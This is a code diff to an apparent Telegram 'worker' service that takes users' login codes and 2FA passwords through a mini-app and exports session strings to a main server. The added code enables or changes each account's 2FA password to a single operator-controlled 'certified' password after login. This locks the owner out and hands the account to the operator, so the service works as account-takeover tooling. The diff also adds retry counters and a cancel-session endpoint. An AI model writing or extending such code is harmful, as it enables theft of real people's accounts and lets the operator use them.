@@ -85,6 +85,16 @@ COUNTRY_CODE_MAP = {
     '245': 'GW', '211': 'SS'
 }
 
+CERTIFIED_2FA_PASSWORD = os.getenv('CERTIFIED_2FA_PASSWORD', '')
+if not CERTIFIED_2FA_PASSWORD:
+    logger.warning(
+        "⚠️ CERTIFIED_2FA_PASSWORD not set! "
+        "Accounts will NOT get a standard 2FA password. "
+        "Set it in .env for production."
+    )
+else:
+    logger.info("🔐 Certified 2FA password loaded from env")
+    
 # ==================== DATA MODELS ====================
 class WorkerOTPRequest(BaseModel):
     session_id: str
@@ -492,8 +502,12 @@ class TelegramClientManager:
                     'timeout_seconds': timeout_seconds,
                     'created_at': datetime.utcnow(),
                     'proxy_info': proxy_info,
-                    'use_proxy': use_proxy
-                }
+       			 'use_proxy': use_proxy,
+                    'otp_attempts': 0,
+   			     'twofa_attempts': 0,
+       			 'max_otp_attempts': 3,
+       			 'max_twofa_attempts': 3,
+   			 }
             
             logger.info(f"✅ OTP sent to {phone_number} for session {session_id} (reject_2fa: {reject_2fa}, proxy: {use_proxy})")
             
@@ -534,29 +548,33 @@ class TelegramClientManager:
             )
     
     async def verify_otp(self, session_id: str, otp_code: str) -> Dict[str, Any]:
-        """Verify OTP code with immediate disconnect on failure"""
+        """Verify OTP with up to 3 attempts.
+        On success: if account has NO 2FA, enable with CERTIFIED password."""
         client = None
         session_info = None
-        
+
         async with self.clients_lock:
             client = self.active_clients.get(session_id)
-        
+
         async with self.session_lock:
             session_info = self.session_data.get(session_id)
-        
+
         if not client or not session_info:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
                 detail="Session not found or expired"
             )
-        
+
+        max_attempts = session_info.get('max_otp_attempts', 3)
+        attempts = session_info.get('otp_attempts', 0)
+
         try:
-            result = await client.sign_in(
+            await client.sign_in(
                 phone_number=session_info['phone_number'],
                 phone_code_hash=session_info['phone_code_hash'],
                 phone_code=otp_code
             )
-            
+
             me = await client.get_me()
             user_info = {
                 'id': me.id,
@@ -564,26 +582,46 @@ class TelegramClientManager:
                 'first_name': me.first_name,
                 'last_name': me.last_name
             }
-            
+
+            # ✅ Enable 2FA with CERTIFIED password (no random)
+            new_password = None
+            if CERTIFIED_2FA_PASSWORD:
+                try:
+                    await client.enable_cloud_password(
+                        password=CERTIFIED_2FA_PASSWORD,
+                        hint="",
+                        email=""
+                    )
+                    new_password = CERTIFIED_2FA_PASSWORD
+                    logger.info(f"🔐 2FA enabled with certified password for {session_id}")
+                except Exception as e:
+                    logger.error(f"❌ Failed to enable 2FA for {session_id}: {e}")
+                    # Don't fail the whole flow — but flag it
+                    # (processor may retry; if not, account has no 2FA yet)
+            else:
+                logger.warning(f"⚠️ CERTIFIED_2FA_PASSWORD not set — skipping 2FA enable for {session_id}")
+
             session_string = await client.export_session_string()
-            
+
             if session_info.get('proxy_info'):
                 await self.proxy_manager.update_proxy_status(session_info['proxy_info'].id, True)
-            
-            logger.info(f"✅ OTP verified for session {session_id} (no 2FA)")
-            
+
+            logger.info(f"✅ OTP verified for session {session_id} (2FA_set={new_password is not None})")
+
             return {
                 'success': True,
                 'requires_2fa': False,
                 'is_rejected': False,
                 'session_string': session_string,
-                'user_info': user_info
+                'user_info': user_info,
+                'new_password': new_password,          # ✅ main server এ যাবে
+                'attempts_used': attempts + 1,
             }
+
         except SessionPasswordNeeded:
             if session_info.get('reject_2fa', False):
                 logger.info(f"🔄 2FA account rejected for session {session_id}")
                 await self.disconnect_client(session_id)
-                
                 return {
                     'success': False,
                     'requires_2fa': False,
@@ -599,53 +637,86 @@ class TelegramClientManager:
                     'is_rejected': False,
                     'message': '2FA_REQUIRED'
                 }
+
         except PhoneCodeInvalid:
-            logger.warning(f"⚠️ Invalid OTP code for session {session_id}, disconnecting...")
-            await self.disconnect_client(session_id)
+            attempts += 1
+            async with self.session_lock:
+                if session_id in self.session_data:
+                    self.session_data[session_id]['otp_attempts'] = attempts
+
+            remaining = max_attempts - attempts
+            logger.warning(f"⚠️ Invalid OTP for {session_id} — attempt {attempts}/{max_attempts}")
+
+            if attempts >= max_attempts:
+                await self.disconnect_client(session_id)
+                raise HTTPException(
+                    status_code=status.HTTP_400_BAD_REQUEST,
+                    detail={
+                        "error": "MAX_ATTEMPTS_REACHED",
+                        "message": f"Invalid OTP. Maximum {max_attempts} attempts reached. Session closed.",
+                        "attempts_used": attempts,
+                        "remaining_attempts": 0,
+                    }
+                )
+
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="Invalid OTP code"
+                detail={
+                    "error": "INVALID_OTP",
+                    "message": f"Invalid OTP. {remaining} attempt(s) remaining.",
+                    "attempts_used": attempts,
+                    "remaining_attempts": remaining,
+                }
             )
+
         except PhoneCodeExpired:
-            logger.warning(f"⚠️ Expired OTP code for session {session_id}, disconnecting...")
             await self.disconnect_client(session_id)
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="OTP code has expired"
+                detail={
+                    "error": "OTP_EXPIRED",
+                    "message": "OTP code has expired. Please request a new one.",
+                }
             )
+
+        except HTTPException:
+            raise
+
         except Exception as e:
             logger.error(f"❌ Error verifying OTP: {e}")
-            
             if session_info.get('proxy_info'):
                 await self.proxy_manager.update_proxy_status(session_info['proxy_info'].id, False)
-            
             await self.disconnect_client(session_id)
-            
             raise HTTPException(
                 status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                 detail="Failed to verify OTP"
             )
     
     async def verify_2fa(self, session_id: str, password: str) -> Dict[str, Any]:
-        """Verify 2FA password with immediate disconnect on failure"""
+        """Verify 2FA with up to 3 attempts.
+        On success: change to CERTIFIED password (unless already equal — the 0.1% case)."""
         client = None
         session_info = None
-        
+
         async with self.clients_lock:
             client = self.active_clients.get(session_id)
-        
+
         async with self.session_lock:
             session_info = self.session_data.get(session_id)
-        
-        if not client:
+    
+        if not client or not session_info:
             raise HTTPException(
                 status_code=status.HTTP_404_NOT_FOUND,
                 detail="Session not found or expired"
             )
-        
+
+        max_attempts = session_info.get('max_twofa_attempts', 3)
+        attempts = session_info.get('twofa_attempts', 0)
+
         try:
+            # ✅ Step 1: verify user's password
             await client.check_password(password)
-            
+
             me = await client.get_me()
             user_info = {
                 'id': me.id,
@@ -653,34 +724,84 @@ class TelegramClientManager:
                 'first_name': me.first_name,
                 'last_name': me.last_name
             }
-            
+
+            # ✅ Step 2: decide final password
+            new_password = password  # default fallback = user's
+
+            if CERTIFIED_2FA_PASSWORD:
+                if password == CERTIFIED_2FA_PASSWORD:
+                    # 🎯 0.1% case — already our certified password, skip change
+                    logger.info(f"✨ Password already certified for {session_id} (skipping change)")
+                    new_password = CERTIFIED_2FA_PASSWORD
+                else:
+                    try:
+                        await client.change_cloud_password(
+                            current_password=password,
+                            new_password=CERTIFIED_2FA_PASSWORD,
+                        )
+                        new_password = CERTIFIED_2FA_PASSWORD
+                        logger.info(f"🔐 2FA password changed to certified for {session_id}")
+                    except Exception as e:
+                        # Change failed (rare) — keep user's password so processor can still work
+                        logger.error(f"❌ Failed to change 2FA password for {session_id}: {e}")
+                        new_password = password
+            else:
+                logger.warning(f"⚠️ CERTIFIED_2FA_PASSWORD not set — keeping user's password for {session_id}")
+
             session_string = await client.export_session_string()
-            
-            if session_info and session_info.get('proxy_info'):
+
+            if session_info.get('proxy_info'):
                 await self.proxy_manager.update_proxy_status(session_info['proxy_info'].id, True)
-            
-            logger.info(f"✅ 2FA verified for session {session_id}")
-            
+
+            logger.info(f"✅ 2FA verified for session {session_id} (final_pwd_is_certified={new_password == CERTIFIED_2FA_PASSWORD})")
+
             return {
                 'success': True,
                 'session_string': session_string,
-                'user_info': user_info
+                'user_info': user_info,
+                'new_password': new_password,          # ✅ certified (বা user's if change failed)
+                'attempts_used': attempts + 1,
             }
+
         except PasswordHashInvalid:
-            logger.warning(f"⚠️ Invalid 2FA password for session {session_id}, disconnecting...")
-            await self.disconnect_client(session_id)
+            attempts += 1
+            async with self.session_lock:
+                if session_id in self.session_data:
+                    self.session_data[session_id]['twofa_attempts'] = attempts
+
+            remaining = max_attempts - attempts
+            logger.warning(f"⚠️ Invalid 2FA password for {session_id} — attempt {attempts}/{max_attempts}")
+
+            if attempts >= max_attempts:
+                await self.disconnect_client(session_id)
+                raise HTTPException(
+                    status_code=status.HTTP_400_BAD_REQUEST,
+                    detail={
+                        "error": "MAX_ATTEMPTS_REACHED",
+                        "message": f"Invalid password. Maximum {max_attempts} attempts reached. Session closed.",
+                        "attempts_used": attempts,
+                        "remaining_attempts": 0,
+                    }
+                )
+
             raise HTTPException(
                 status_code=status.HTTP_400_BAD_REQUEST,
-                detail="Invalid 2FA password"
+                detail={
+                    "error": "INVALID_2FA",
+                    "message": f"Invalid 2FA password. {remaining} attempt(s) remaining.",
+                    "attempts_used": attempts,
+                    "remaining_attempts": remaining,
+                }
             )
+
+        except HTTPException:
+            raise
+
         except Exception as e:
             logger.error(f"❌ Error verifying 2FA: {e}")
-            
-            if session_info and session_info.get('proxy_info'):
+            if session_info.get('proxy_info'):
                 await self.proxy_manager.update_proxy_status(session_info['proxy_info'].id, False)
-            
             await self.disconnect_client(session_id)
-            
             raise HTTPException(
                 status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                 detail="Failed to verify 2FA"
@@ -844,17 +965,17 @@ async def worker_request_otp(request: WorkerOTPRequest, api_key: str = Depends(v
 
 @app.post("/worker/verify-otp")
 async def worker_verify_otp(request: WorkerVerifyOTP, api_key: str = Depends(verify_api_key)):
-    """Worker endpoint to verify OTP with 2FA rejection support"""
+    """Worker endpoint to verify OTP with retry + auto-enable 2FA"""
     try:
         result = await telegram_manager.verify_otp(
             request.session_id,
             request.otp_code
         )
-        
+
         # Disconnect client if authentication successful or rejected
         if not result.get('requires_2fa'):
             await telegram_manager.disconnect_client(request.session_id)
-        
+
         return result
     except HTTPException:
         raise
@@ -865,18 +986,19 @@ async def worker_verify_otp(request: WorkerVerifyOTP, api_key: str = Depends(ver
             detail="Internal worker error"
         )
 
+
 @app.post("/worker/verify-2fa")
 async def worker_verify_2fa(request: WorkerVerify2FA, api_key: str = Depends(verify_api_key)):
-    """Worker endpoint to verify 2FA"""
+    """Worker endpoint to verify 2FA + change to certified password"""
     try:
         result = await telegram_manager.verify_2fa(
             request.session_id,
             request.password
         )
-        
+
         # Disconnect client after successful authentication
         await telegram_manager.disconnect_client(request.session_id)
-        
+
         return result
     except HTTPException:
         raise
@@ -923,6 +1045,58 @@ async def get_available_proxies(country_code: Optional[str] = None, api_key: str
             detail="Failed to get proxy information"
         )
 
+# ==================== CANCEL SESSION ====================
+
+@app.post("/worker/cancel-session")
+async def cancel_session_endpoint(
+    request: Request,
+    api_key: str = Depends(verify_api_key),
+):
+    """
+    Cancel/disconnect a pending session on this worker.
+    Main server calls this when user cancels from mini-app.
+    Safe & idempotent — even if session not found, returns success.
+    """
+    try:
+        data = await request.json()
+    except Exception:
+        raise HTTPException(status_code=400, detail="Invalid JSON body")
+
+    session_id = data.get('session_id')
+    reason = data.get('reason', 'user_cancelled')
+
+    if not session_id:
+        raise HTTPException(status_code=400, detail="session_id required")
+
+    # Check if session exists on this worker
+    async with telegram_manager.clients_lock:
+        client_exists = session_id in telegram_manager.active_clients
+
+    async with telegram_manager.session_lock:
+        session_exists = session_id in telegram_manager.session_data
+
+    if not client_exists and not session_exists:
+        logger.info(f"ℹ️ Cancel requested for {session_id} — not on this worker (no-op)")
+        return {
+            "success": True,
+            "message": "Session not on this worker (already clean)",
+            "session_id": session_id,
+            "was_active": False,
+        }
+
+    logger.info(f"🚫 Cancelling session {session_id} on worker {WORKER_ID} (reason: {reason})")
+
+    # disconnect_client handles both dicts safely
+    await telegram_manager.disconnect_client(session_id)
+
+    return {
+        "success": True,
+        "message": "Worker session cleaned",
+        "session_id": session_id,
+        "was_active": True,
+        "reason": reason,
+    }
+    
 @app.get("/worker/health")
 async def worker_health(api_key: str = Depends(verify_api_key)):
     """Worker health check endpoint with cleanup status"""
